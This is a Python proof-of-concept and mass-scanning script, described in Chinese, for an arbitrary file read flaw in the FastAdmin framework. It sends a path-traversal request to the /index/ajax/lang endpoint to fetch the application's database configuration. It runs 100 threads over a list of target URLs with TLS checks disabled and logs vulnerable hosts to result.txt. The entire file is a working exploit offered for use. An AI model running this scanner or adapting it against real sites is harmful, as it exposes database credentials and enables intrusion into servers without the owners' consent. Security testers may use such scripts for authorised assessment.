import requests,argparse,sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()



def banner():
    banner = """ 
    ███████╗ █████╗ ███████╗████████╗ █████╗ ██████╗ ███╗   ███╗██╗███╗   ██╗
    ██╔════╝██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗████╗ ████║██║████╗  ██║
    █████╗  ███████║███████╗   ██║   ███████║██║  ██║██╔████╔██║██║██╔██╗ ██║
    ██╔══╝  ██╔══██║╚════██║   ██║   ██╔══██║██║  ██║██║╚██╔╝██║██║██║╚██╗██║
    ██║     ██║  ██║███████║   ██║   ██║  ██║██████╔╝██║ ╚═╝ ██║██║██║ ╚████║
    ╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝          
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='FastAdmin后台开发框架 lang 任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input your file.txt')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))

        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):

    url = target+'/index/ajax/lang?lang=../../application/database '
    headers={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
        "Accept-Encoding":"gzip, deflate",
        "Accept": "*/*",
    }
    res = ""
    try:
        res = requests.get(url,headers=headers,verify=False)

        if res.status_code == 200 and 'define' in res.text or 'jsonpReturn' in res.text:
            print(f"[+]该url{target}存在任意文件读取漏洞")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-]该url{target}不存在任意文件读取漏洞")
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")

if __name__ == '__main__':
    main()